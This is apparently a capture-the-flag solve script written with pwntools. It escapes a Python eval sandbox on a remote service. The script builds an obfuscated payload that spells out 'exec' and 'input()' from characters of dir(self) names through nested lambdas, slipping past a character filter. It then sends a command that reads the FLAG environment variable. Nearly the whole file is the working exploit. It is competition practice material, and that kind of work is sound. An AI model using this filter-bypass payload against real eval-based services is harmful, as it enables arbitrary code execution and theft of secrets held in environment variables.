#!/usr/bin/env python3
from pwn import *
from itertools import combinations

context.log_level = "error"

io = remote(args.HOST, args.PORT, ssl=args.SSL)
if args.TEAM_TOKEN:
    io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

params = ["a" * i for i in range(1, 30)]


## there are 29 items in dir(self)


def get_param_names(s):
    available = "abdefgilmrstv"
    comb = combinations(available, 3)
    params = ["".join(next(comb)) for _ in s]
    return params


title = r"                    (now with refactored code!)"

left_parentheses_idx = title.find("(")
right_parentheses_idx = title.find(")")

title = get_param_names(title)


def get_left_parentheses():
    global left_parentheses_idx
    return f"(lambda {','.join(title)}: {title[left_parentheses_idx]})(*self.title)"


def get_right_parentheses():
    global right_parentheses_idx
    return f"(lambda {','.join(title)}: {title[right_parentheses_idx]})(*self.title)"


def get_both_parentheses():
    global left_parentheses_idx, right_parentheses_idx
    return f"(lambda {','.join(title)}: {title[left_parentheses_idx]} + {title[right_parentheses_idx]})(*self.title)"


# ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__',
# '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__',
# '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__',
# '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__',
# '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__',
# 'run_code']


def get_exec():
    # __delattr__ for 'e' -> 1st
    # __reduce_ex__ for 'x' -> 20
    # __delattr__ for 'e' -> 1st
    # __class__ for 'c' -> 0th
    global params
    delattr = get_param_names("__delattr__")
    reduce_ex = get_param_names("__reduce_ex__")
    class_ = get_param_names("__class__")
    return (
        f"(lambda {','.join(params)} : "
        + f"(lambda {','.join(delattr)}: {delattr[3]})(*{params[1]}) + "
        + f"(lambda {','.join(reduce_ex)}: {reduce_ex[10]})(*{params[20]}) + "
        + f"(lambda {','.join(delattr)}: {delattr[3]})(*{params[1]}) + "
        + f"(lambda {','.join(class_)}: {class_[2]})(*{params[0]}))"
        + "(*dir(self))"
    )


def get_input():
    # we want to send 'input()'
    # __init__ for 'in' -> 12th entry (from 0) in dir(self)
    # __repr__ for 'p' -> 21th entry (from 0) in dir(self)
    # __getattribute__ for 'ut' -> 8th entry (from 0) in dir(self)
    global params
    init = get_param_names("__init__")
    repr = get_param_names("__repr__")
    getattribute = get_param_names("__getattribute__")
    return (
        f"(lambda {','.join(params)} : "
        + f"(lambda {','.join(init)}: {init[2]} + {init[3]})(*{params[12]}) + "
        + f"(lambda {','.join(repr)}: {repr[4]})(*{params[21]}) + "
        + f"(lambda {','.join(getattribute)}: {getattribute[11]} + {getattribute[12]})(*{params[8]}))(*dir(self))"
    )


payload = (
    "eval("
    + "+".join(
        [
            get_exec(),
            get_left_parentheses(),
            get_input(),
            get_both_parentheses(),
            get_right_parentheses(),
        ]
    )
    + ")"
)

io.sendlineafter(b"Will you be able to read the $FLAG?\n> ", payload.encode("ascii"))
io.sendline(b"import os; print(os.getenv('FLAG'))")
flag = io.recvuntil(b"}").decode().strip()
print(flag)
